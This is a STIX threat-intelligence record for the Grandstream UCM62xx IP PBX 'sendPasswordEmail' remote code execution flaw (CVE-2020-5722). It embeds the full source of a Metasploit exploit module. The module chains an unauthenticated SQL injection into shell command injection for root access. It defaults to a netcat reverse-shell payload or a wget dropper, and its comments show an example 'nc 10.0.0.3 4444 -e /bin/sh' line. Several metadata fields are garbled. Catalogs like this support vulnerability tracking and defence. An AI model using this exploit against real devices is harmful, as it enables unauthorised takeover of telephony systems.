{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--878c009a-a8ec-4978-a16f-e5b6f01e96ab",
    "created": "2024-08-14T17:02:32.107651Z",
    "modified": "2024-08-14T17:02:32.107655Z",
    "name": "Grandstream UCM62xx IP PBX sendPasswordEmail RCE",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/grandstream_ucm62xx_sendemail_rce.rb",
            "external_id": "grandstream_ucm62xx_sendemail_rce.rb"
        },
        {
            "source_name": "acommandinjectionvulnerability(technically",
            "external_id": "noassignedCVEbutwasinadvertently"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-5722"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Grandstream UCM62xx IP PBX sendPasswordEmail RCE',\n        'Description' => %q{\n          This module exploits an unauthenticated SQL injection vulnerability (CVE-2020-5722) and\n          a command injection vulnerability (technically, no assigned CVE but was inadvertently\n          patched at the same time as CVE-2019-10662) affecting the Grandstream UCM62xx IP PBX\n          series of devices. The vulnerabilities allow an unauthenticated remote attacker to\n          execute commands as root.\n\n          Exploitation happens in two stages:\n\n          1. An SQL injection during username lookup while executing the \"Forgot Password\" function.\n          2. A command injection that occurs after the user provided username is passed to a Python script\n          via the shell. Like so:\n\n          /bin/sh -c python /app/asterisk/var/lib/asterisk/scripts/sendMail.py \\\n          password '' `cat <<'TTsf7G0' z' or 1=1--`;`nc 10.0.0.3 4444 -e /bin/sh`;` TTsf7G0 `\n\n          This module affect UCM62xx versions before firmware version 1.0.19.20.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'jbaines-r7' # Vulnerability discovery, original exploit, and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2020-5722' ],\n          [ 'EDB', '48247']\n        ],\n        'DisclosureDate' => '2020-03-23',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_ARMLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'Payload' => {\n                'DisableNops' => true,\n                'BadChars' => '\\'&|'\n              },\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget' ]\n            }\n          ]\n        ],\n        'DefaultTarget' => 1,\n        'DefaultOptions' => {\n          'RPORT' => 8089,\n          'SSL' => true\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK ]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/'])\n    ])\n  end\n\n  ##\n  # Sends a POST /cgi request with a payload of action=getInfo. The\n  # server should respond with a large json blob like the following,\n  # where \"prog_version\" is he firmware version:\n  #\n  # {\"response\"=>{\n  #   \"model_name\"=>\"UCM6202\", \"description\"=>\"IPPBX Appliance\",\n  #   \"device_name\"=>\"\", \"logo\"=>\"images/h_logo.png\", \"logo_url\"=>\"http://www.grandstream.com/\",\n  #   \"copyright\"=>\"Copyright \\u00A9 Grandstream Networks, Inc. 2014. All Rights Reserved.\",\n  #    \"num_fxo\"=>\"2\", \"num_fxs\"=>\"2\", \"num_pri\"=>\"0\", \"num_eth\"=>\"2\", \"allow_nat\"=>\"1\",\n  #    \"svip_type\"=>\"4\", \"net_mode\"=>\"0\", \"prog_version\"=>\"1.0.18.13\", \"country\"=>\"US\",\n  #    \"support_openvpn\"=>\"1\", \"enable_openvpn\"=>\"0\", \"enable_webrtc_openvpn\"=>\"0\",\n  #    \"support_webrtc_cloud\"=>\"0\"}, \"status\"=>0}\n  ###\n  def check\n    normalized_uri = normalize_uri(target_uri.path, '/cgi')\n    vprint_status(\"Requesting version information from #{normalized_uri}\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalized_uri,\n      'vars_post' => { 'action' => 'getInfo' }\n    })\n\n    return CheckCode::Unknown('HTTP status code is not 200') unless res&.code == 200\n\n    body_json = res.get_json_document\n    return CheckCode::Unknown('No JSON in response') unless body_json\n\n    prog_version = body_json.dig('response', 'prog_version')\n    return false if prog_version.nil?\n\n    vprint_status(\"The reported version is: #{prog_version}\")\n\n    version = Rex::Version.new(prog_version)\n    if version < Rex::Version.new('1.0.19.20')\n      return CheckCode::Appears(\"This determination is based on the version string: #{prog_version}.\")\n    end\n\n    return CheckCode::Safe(\"This determination is based on the version string: #{prog_version}.\")\n  end\n\n  ##\n  # Throws a payload at the sendPasswordEmail action. The payload must first survive an SQL injection\n  # and then it will get passed to a python script via sh which allows us to execute a command injection.\n  # It will look something like this:\n  #\n  # /bin/sh -c python /app/asterisk/var/lib/asterisk/scripts/sendMail.py \\\n  #     password '' `cat <<'TTsf7G0' z' or 1=1--`;`nc 10.0.0.3 4444 -e /bin/sh`;` TTsf7G0 `\n  #\n  # This functionality is related to the\"Forgot Password\" feature. This function is rate limited by\n  # the server so that an attacker can only invoke it, at most, every 60 seconds. As such, only a few\n  # payloads are appropriate.\n  ###\n  def execute_command(cmd, _opts = {})\n    rand_num = Rex::Text.rand_text_numeric(1..5)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/cgi'),\n      'vars_post' =>\n      {\n        'action' => 'sendPasswordEmail',\n        'user_name' => \"' or #{rand_num}=#{rand_num}--`;`#{cmd}`;`\"\n      }\n    }, 5)\n\n    # the netcat reverse shell payload holds the connection open. So we'll treat no response\n    # as a success. The meterpreter payload does not hold the connection open so this clause digs\n    # deeper to ensure it succeeded. The server will respond with a non-0 status if the payload\n    # generates an error (e.g. rate limit error)\n    if res\n      fail_with(Failure::UnexpectedReply, 'The target did not respond with a 200 OK') unless res.code == 200\n\n      body_json = res.get_json_document\n      fail_with(Failure::UnexpectedReply, 'The target did not respond with a JSON body') unless body_json\n\n      status_json = body_json['status']\n      fail_with(Failure::UnexpectedReply, 'The JSON response is missing the status element') unless status_json\n      fail_with(Failure::UnexpectedReply, \"The server responded with an error status #{status_json}\") unless status_json == 0\n    end\n\n    print_good('Exploit successfully executed.')\n  end\n\n  def exploit\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n    case target['Type']\n    when :unix_cmd\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-03-23",
    "x_mitre_platforms": [
        "linux'"
    ]
}